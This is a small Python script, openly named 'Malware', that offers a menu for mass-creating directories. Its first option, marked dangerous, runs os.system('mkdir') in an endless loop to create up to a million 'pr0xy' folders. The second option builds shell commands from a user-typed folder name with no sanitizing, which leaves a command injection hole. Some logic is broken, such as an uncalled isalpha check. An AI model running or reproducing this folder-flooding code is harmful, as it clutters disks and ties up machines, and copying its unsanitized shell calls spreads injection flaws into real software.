from colorama import Fore
import os

class Malware(object):

    def __init__(self):

        Firstline = Fore.CYAN + "[1] " + Fore.RESET + Fore.MAGENTA + "Open the folder until the computer " + Fore.RESET + Fore.RED + "*[Dangerous!]*" + Fore.RESET
        SecondLine = Fore.CYAN + "[2] " + Fore.RESET + Fore.MAGENTA + "Open the folder until the entered value " + Fore.RESET
        ThirdLine = Fore.CYAN + "[3] " + Fore.RESET + Fore.MAGENTA + "Exit " + Fore.RESET
        print(
            Firstline,"\n" +
            SecondLine,"\n" +
            ThirdLine
        )

    def InfiniteFolder(self):
        folderlist = os.listdir()
        Counter = 0
        FolderName = "pr0xy"
        while True:
            Counter += 1
            if Counter <= 1000000:
                os.system("mkdir {}{}".format(FolderName, str(Counter)))
    
    def OpenFolder(self):
        yn = Fore.RED + "(y/N): " + Fore.RESET
        number = input(Fore.MAGENTA + "How many are you hungry: " + Fore.RESET)
        if number.isdigit():
            number = int(number)
            folderName = input(Fore.MAGENTA + "Want to enter the folder names are used to create or default folder name {}".format(yn) + Fore.RESET)
            if folderName.isalpha:
                folderName = str(folderName)
                if folderName == "Y" or folderName == "y" or folderName == "yes" or folderName == "Yes" or folderName == "YES":
                    FolderNam_e = input("Enter the folder name to be created: ")
                    Counter = 0
                    isCounter = False
                    while not isCounter:
                        Counter += 1
                        if Counter <= number:
                            os.system("mkdir {}{}".format(FolderNam_e, str(Counter)))
                        else:
                            isCounter = True
                            break
                elif folderName == "N" or folderName == "n" or folderName == "no" or folderName == "No" or folderName == "NO":
                    Counter = 0
                    FolderNam_e = "pr0xy"
                    while True:
                        Counter += 1
                        if Counter <= number:
                            os.system("mkdir {}{}".format(FolderNam_e, str(Counter)))
                        else:
                            break
                elif folderName.isdigit():
                    print(Fore.RED + "Do not touch the numerical expression" + Fore.RESET)
                else:
                    print(Fore.RED + "Please only touch Yes or No!" + Fore.RESET) 
            else:
                print(Fore.RED + "Do not touch the numerical expression" + Fore.RESET)
        else:
            print(Fore.RED + "Textual expression keying" + Fore.RESET)

start = Malware()
choice = input(Fore.MAGENTA + "Your Choice: " + Fore.RESET)
if choice.isdigit():
    choice = int(choice)
    if choice == 1:
        start.InfiniteFolder()
    elif choice == 2:
        start.OpenFolder()
    elif choice == 3:
        pass
    else:
        print(Fore.RED + "Please 1, 2 or 3 Dial" + Fore.RESET)
else:
    print(Fore.RED + "Please key in a numeric expression" + Fore.RESET)